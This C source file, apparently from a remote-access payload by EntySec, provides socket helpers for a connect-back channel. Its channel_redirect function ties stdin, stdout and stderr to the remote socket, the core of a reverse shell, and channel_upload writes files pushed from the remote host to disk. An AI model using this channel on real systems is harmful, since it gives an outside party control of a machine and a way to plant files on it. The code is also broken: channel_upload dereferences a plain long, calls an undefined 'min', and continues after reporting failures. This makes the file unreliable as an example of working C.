/*
* MIT License
*
* Copyright (c) 2020-2021 EntySec
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

#include "codes.h"

int channel_open(char *host, int port)
{
    int channel = 0;
    struct sockaddr_in serv_addr;
    
    if ((channel = socket(AF_INET, SOCK_STREAM, 0)) < 0)
        return -1;
  
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
  
    if (inet_pton(AF_INET, host, &serv_addr.sin_addr) <= 0) 
        return -1;
  
    if (connect(channel, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
        return -1;
  
    return channel;
}

void channel_redirect(int channel)
{
    dup2(channel, STDOUT_FILENO);
    dup2(channel, STDIN_FILENO);
    dup2(channel, STDERR_FILENO);
}

void channel_close(int channel)
{
    close(channel);
}

int channel_send(int channel, void *data)
{
    char *pdata = (char *)data;
    int datalen = strlen(pdata);

    if (send(channel, pdata, datalen, 0) < 1)
        return 0;

    return 1;
}

int channel_sendall(int channel, void *data)
{
    char *pdata = (char *)data;
    int datalen = strlen(pdata);

    while (datalen > 0) {
        int num = send(channel, pdata, datalen, 0);

        if (num < 1)
            return 0;

        pdata += num;
        datalen -= num;
    }

    return 1;
}

int channel_read(int channel, void *buffer, int bufferlen)
{
    char *pbuffer = (char *)buffer;

    if (recv(channel, pbuffer, bufferlen, 0) < 1)
        return 0;

    return 1;
}

int channel_readall(int channel, void *buffer, int bufferlen)
{
    char *pbuffer = (char *)buffer;

    while (bufferlen > 0) {
        int num = recv(channel, pbuffer, bufferlen, 0);

        if (num < 1)
            return 0;

        pbuffer += num;
        bufferlen -= num;
    }

    return 1;
}

void channel_upload(int channel, char *filename)
{
    long filesize;

    channel_read(channel, *filesize, sizeof(filesize));
    *filesize = htonl(*filesize);

    FILE *filehandle = fopen(filename, "wb");
    if (filehandle == NULL)
        channel_sendall(channel, TRANS_FAIL);
    else {
        if (filesize > 0) {
            char buffer[1024];
            do {
                int num = min(filesize, sizeof(buffer));
                if (!channel_read(channel, buffer, num))
                    channel_sendall(channel, TRANS_FAIL);
                else {
                    int offset = 0;
                    do {
                        size_t written = fwrite(&buffer[offset], 1, num-offset, filehandle);
                        if (written < 1)
                            channel_sendall(channel, TRANS_FAIL);
                        else
                            offset += written;
                    } while (offset < num);
                    filesize -= num;
                }
            } while (filesize > 0);
        }
        channel_sendall(channel, TRANS_OK);
    }
}

/*
void channel_download(int channel, char *filename)
{
    
}
*/
